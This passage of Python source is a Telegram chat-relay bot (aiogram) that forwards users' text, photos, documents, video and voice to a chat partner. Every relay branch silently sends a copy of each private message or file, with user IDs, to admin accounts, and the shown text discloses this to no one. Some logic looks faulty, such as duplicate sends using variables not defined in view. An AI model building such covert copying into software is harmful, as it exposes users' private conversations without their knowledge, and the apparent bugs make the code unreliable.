        text = f"💬 Сообщение от {sender_name}:\n{message.text}"
        await bot.send_message(recipient_id, text)

        # Лог для адміна
        for admin in ADMIN_IDS:
            await bot.send_message(admin, f"📩 [{sender_id} ➝ {recipient_id}]: {message.text}")

    # === Фото ===
    elif message.photo:
        file = message.photo[-1].file_id
        caption = f"📷 Фото от {sender_name}"
        await bot.send_photo(recipient_id, file, caption=caption)
        for admin in ADMIN_IDS:
            await bot.send_photo(admin, file, caption=f"📥 [{sender_id} ➝ {recipient_id}] Фото")

    # === Документ ===
    elif message.document:
        file = message.document.file_id
        await bot.send_document(recipient_id, file, caption=f"📎 Файл от {sender_name}")
        for admin in ADMIN_IDS:
            await bot.send_document(admin, file, caption=f"📥 [{sender_id} ➝ {recipient_id}] Документ")

    # === Відео ===
    elif message.video:
        file = message.video.file_id
        await bot.send_video(recipient_id, file, caption=f"🎥 Видео от {sender_name}")
        for admin in ADMIN_IDS:
            await bot.send_video(admin, file, caption=f"📥 [{sender_id} ➝ {recipient_id}] Видео")

    # === Голосове ===
    elif message.voice:
        file = message.voice.file_id
        await bot.send_voice(recipient_id, file, caption=f"🎤 Голосове сообщение от {sender_name}")
        for admin in ADMIN_IDS:
            await bot.send_voice(admin, file, caption=f"📥 [{sender_id} ➝ {recipient_id}] Voice")

    else:
        await message.reply("⚠️ Тип повідомлення не підтримується.")

    # Відправляємо співрозмовнику
    await bot.send_message(target_id, f"💬 Сообщение от @{message.from_user.username or 'user'}:\n{message.text}")

    # Відправляємо адміну копію
    for admin in ADMIN_IDS:
        await bot.send_message(admin, f"📩 [Диалог] {user_id} ➝ {target_id}:\n{message.text}")

@dp.message_handler(content_types=[types.ContentType.PHOTO, types.ContentType.DOCUMENT, types.ContentType.VIDEO])
async def user_media_relay(message: types.Message):
    user_id = message.from_user.id

    if user_id not in chat_links or "with" not in chat_links[user_id]:
        return  # немає активного чату

    target_username = chat_links[user_id]["with"]

    # знайти ID співрозмовника по username
    target_id = None
    for uid, data in chat_links.items():
        if data.get("ad", {}).get("username") == target_username:
            target_id = uid
            break

    if not target_id:
        return await message.answer("⚠️ Пользователь недоступен.")

    caption = f"📎 От @{message.from_user.username or 'user'}"
    admins_caption = f"📥 Медиа: {user_id} ➝ {target_id}"

    if message.photo:
        await bot.send_photo(target_id, message.photo[-1].file_id, caption=caption)
        for admin in ADMIN_IDS:
            await bot.send_photo(admin, message.photo[-1].file_id, caption=admins_caption)
    elif message.document:
        await bot.send_document(target_id, message.document.file_id, caption=caption)
        for admin in ADMIN_IDS:
            await bot.send_document(admin, message.document.file_id, caption=admins_caption)
    elif message.video:
        await bot.send_video(target_id, message.video.file_id, caption=caption)
        for admin in ADMIN_IDS:
            await bot.send_video(admin, message.video.file_id, caption=admins_caption)

@dp.callback_query_handler(lambda c: c.data == "end_chat")
async def end_chat(call: types.CallbackQuery):
    user_id = call.from_user.id

    if user_id not in chat_links or "with" not in chat_links[user_id]:
        return await call.message.answer("⚠️ У вас нет активного диалога.")

    # повідомити обох
    target_username = chat_links[user_id]["with"]
    target_id = None

    for uid, data in chat_links.items():
        if data.get("ad", {}).get("username") == target_username:
            target_id = uid
            break

    if target_id:
        await bot.send_message(target_id, "❌ Диалог завершен другой стороной.")
        chat_links.pop(target_id, None)

    await call.message.answer("✅ Диалог завершен.")
    chat_links.pop(user_id, None)

@dp.message_handler(content_types=types.ContentTypes.ANY)
async def relay_messages(message: types.Message):
    sender_id = message.from_user.id
    if sender_id in active_orders:
        recipient_id = active_orders[sender_id]
        # Відправити текст або медіа
        if message.content_type == "text":
            await bot.send_message(recipient_id, f"💬 {message.text}")
        elif message.content_type in ["photo", "document", "video", "voice"]:
            await bot.copy_message(recipient_id, sender_id, message.message_id)


# === Запуск
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)

